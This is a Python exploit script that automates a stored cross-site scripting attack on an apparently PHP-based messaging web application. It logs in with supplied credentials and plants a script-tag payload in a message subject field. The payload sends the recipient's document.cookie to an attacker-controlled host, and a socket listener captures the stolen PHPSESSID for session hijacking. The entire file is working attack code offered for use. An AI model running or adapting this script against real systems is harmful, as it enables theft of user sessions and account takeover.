#!/usr/bin/python3
# Author : twseptian

import requests
import sys
import os
import urllib
import re
import socket
from random import randint
import datetime
import argparse

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

class Interface ():
    def __init__ (self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.yellow = '\033[93m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def header(self):
        print('\n    >> XSS Stealing Cookies and Hijacking Authenticated Sessions')
        print('    >> by twseptian\n')

    def info (self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning (self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error (self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success (self, message):
        print(f"[{self.green}âœ“{self.end}] {self.bold}{message}{self.end}")

# Instantiate our interface class
global output
output = Interface()
output.header()

proxies = {'http':'http://127.0.0.1:8080','https':'https://127.0.0.1:8080'} #proxies
port = randint(5000,9000) #port
attacker_ip = "127.0.0.1" #attacker ip

def authentication(username,password):
	global session
	global cookies
	session = requests.Session()
	data = { "username" : username, "password" : password }
	try:
		response = session.post(target_ip+"/classes/Login.php?f=login_user",data=data,verify=False, proxies=proxies)
		output.success("Logged in successfully")
		cookies = response.cookies.get_dict()
	except requests.HTTPError as exception:
		output.error("HTTP Error : {}".format(exception))
		sys.exit(1)

def servers(port):
    HOST = ''
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST,port))
        s.listen(1)
        conn, addr = s.accept()
        with conn:
            m=conn.recv(2048)
            output.info("XSS triggered capturing cookies to login")
            out=re.findall("PHPSESSID\%3D.*HTTP", m.decode('utf-8'))
            out=out[0].replace("PHPSESSID%3D","").replace("HTTP","")
            return (out.replace("\n","").replace("\t",""))

def send_message(attacker_ip, port):
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", 
    "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", 
    "Connection": "close", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin"}
    url = target_ip+"/classes/Master.php?f=save_message"
    xss = "<script>document.location='http://{}:{}/' +escape(document.cookie)</script>".format(attacker_ip,port)
    data_input = {"id": '', "to_user": "2", "user": '', "subject": xss, "message": "<p>test<br></p>"}
    output.info("Sending xss vector via message")
    send_data = session.post(url,cookies=cookies, proxies=proxies,data=data_input)
    if send_data.status_code == 200:
        output.success("XSS payload sent successfull")
        cookie=servers(port)
        output.success("Grab victim's PHPSESSID: {}".format(cookie))
    else:
        output.error("XSS payload, failed")
        exit()

def get_args():
    parser = argparse.ArgumentParser(description='XSS Stealing Cookies and Hijacking Authenticated Sessions')
    parser.add_argument('-t', '--target', dest="url", required=True, action='store', help='Target')
    parser.add_argument('-u', '--username', dest="username", required=True, action='store', help='Username target')
    parser.add_argument('-p', '--password', dest="password", required=True, action='store', help='Password target')
    args = parser.parse_args()
    return args
try:
    args = get_args()
    target_ip = args.url
    username = args.username
    password = args.password

    authentication(username,password)
    send_message(attacker_ip,port)

except KeyboardInterrupt:
    pass

